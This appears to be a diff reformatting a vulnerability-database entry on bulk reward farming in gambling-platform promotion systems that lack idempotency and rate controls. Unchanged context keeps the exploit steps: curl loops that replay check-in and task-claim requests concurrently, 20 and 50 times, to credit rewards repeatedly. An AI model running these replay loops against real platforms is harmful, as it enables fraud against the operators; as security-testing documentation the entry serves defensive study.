@@ -1,23 +1,43 @@
 ﻿---
-title: Bulk farming of check-in / task rewards (missing idempotency and rate controls)
-cve: None (business logic)
-severity: high
+id: "daily-reward-farming"
+title: "Bulk farming of check-in / task rewards (missing idempotency and rate controls)"
+kind: "business-logic"
+cve: null
+related-cves: null
+cve-note: "None (business logic)"
+severity: "high"
 cvss: 7.8
-product: Custom promotion system (gambling/turnkey platforms)
-versions: Any
-ports: 80, 443
-keywords: check-in, tasks, rewards, farming, idempotency, concurrency
-entry: /api/activity/sign、/api/task/claim
+severity-basis: "cvss"
+severity-note: null
+product: "Custom promotion system (gambling/turnkey platforms)"
+versions: "Any"
+ports: "80, 443"
+keywords: "check-in, tasks, rewards, farming, idempotency, concurrency"
+entry: "/api/activity/sign, /api/task/claim"
 verified: false
-sources: Compiled from public sources (business logic; no CVE)
+verified-on: null
+verification-evidence: null
+source-url: null
+vendor-advisory: null
+cwe: null
+patch-date: null
+sources: "Compiled from public sources (business logic; no CVE)"
+kev: null
+kev-date: null
+kev-source: null
+epss: null
+epss-percentile: null
+epss-date: null
+epss-source: null
+enrichment-updated: null
 ---
 
-## Fingerprints
+## Fingerprinting
 
 ```
-POST /api/activity/sign     {"actId":1}
-POST /api/task/claim        {"taskId":12}
-GET  /api/activity/list
+POST /api/activity/sign {"actId":1}
+POST /api/task/claim {"taskId":12}
+GET /api/activity/list
 ```
 
 ## Prerequisites
@@ -32,7 +52,7 @@ curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" 
 
 # 2) Replay 20 times concurrently (unchanged parameters) — missing idempotency causes duplicate credits
 for i in $(seq 1 20); do
-  curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}' &
+ curl -s -X POST https://target/api/activity/sign -H "Authorization: Bearer <t>" -d '{"actId":1}' &
 done; wait
 # Result: balance increase = 20 times the check-in reward = confirmed
 
@@ -54,4 +74,4 @@ for a in $(seq 1 50); do curl -s -X POST https://target/api/task/claim -H "Autho
 
 ## References
 
-- OWASP WSTG-BUSL-04；CWE-837。
+- OWASP WSTG-BUSL-04; CWE-837.
